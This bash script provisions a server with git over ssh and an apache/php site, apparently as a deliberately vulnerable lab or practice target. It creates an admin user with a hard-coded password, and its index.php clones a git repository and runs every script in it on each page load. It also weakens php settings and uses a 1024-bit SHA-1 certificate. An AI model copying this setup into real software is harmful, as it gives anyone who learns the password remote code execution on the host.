#!/bin/bash

#These first few lines ensure we have what we need to run. Without the update the install will often crash
apt-get update
apt-get install -y git
apt-get install -y ssh

#---Setting up the git server---
#This was the best way I could find to create a user with a password without prompting for input
adduser admin --gecos "" --disabled-password
echo "admin:empiredidnothingwrong" | chpasswd
mkdir /home/admin/admin
git init --bare /home/admin/admin
chown -R admin:admin /home/admin
echo "AllowUsers admin" | tee -a /etc/ssh/sshd_config
service ssh restart

#---Setting up the web server---
#This configures apache to use https and redirect all port 80 connections to 443
sites='<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	Redirect permanent / https://127.0.0.1
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combines
</VirtualHost>

<VirtualHost *:443>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	SSLEngine on
	SSLCertificateFile /var/www/server.crt
	SSLCertificateKeyFile /var/www/server.key
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>'
#This is the code for the webpage
index="<html>
<body>
<?php
\$output = shell_exec('mkdir /tmp/scripts ; git clone /home/admin/admin /tmp/scripts ; chmod 744 /tmp/scripts/* ; run-parts --regex \".*\" /tmp/scripts ; rm -rf /tmp/scripts');
echo \$output;
?>
</body>
</html>"
#generating the server key
openssl req -new -x509 -sha1 -newkey rsa:1024 -nodes -keyout server.key -out server.crt -subj '/O=Company/OU=Department/CN=localhost'
apt-get install -y apache2 apache2-doc apache2-utils
apt-get install -y php
#Moving the server keys to a more reliable location
mv ./server.crt /var/www/server.crt
mv ./server.key /var/www/server.key
#These commands enable ssl and php on the apache server
a2enmod ssl
a2enmod php7.0
#These lines modify the apache config file and default webpage
echo "$sites" | tee /etc/apache2/sites-available/000-default.conf
echo "$index" | tee /var/www/html/index.php
rm /var/www/html/index.html
#This command allows php to run the shell_exec command
echo "safe_mode = Off" | tee -a /etc/php/7.0/apache2/php.ini
#Starting the web server
service apache2 restart
#And we are good to go!
